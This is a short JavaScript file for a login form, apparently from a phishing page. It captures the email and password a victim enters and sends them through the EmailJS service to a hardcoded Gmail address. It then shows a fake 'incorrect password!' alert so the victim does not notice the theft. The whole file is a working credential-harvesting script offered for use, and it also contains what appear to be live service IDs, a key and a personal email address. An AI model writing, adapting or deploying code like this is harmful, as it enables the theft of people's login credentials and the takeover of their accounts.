// Initialize EmailJS with your public key
emailjs.init("txiXzYFQsdl7CPEJj");

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function (e) {
  e.preventDefault();

  // Get the email and password from the form
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Check if email and password are being captured correctly
  console.log("Email: " + email);
  console.log("Password: " + password);

  // Send email via EmailJS
  emailjs.send(
    "service_xzw09ls",   // Your EmailJS service ID
    "template_vuxwehe",  // Your EmailJS template ID
    {
      to_email: "marcjackson750@gmail.com",  // Replace this with your own email address
      email: email,
      password: password
    }
  ).then(function(response) {
    alert("incorrect password!");
  }, function(error) {
    alert("Error: " + error.text);
  });
});
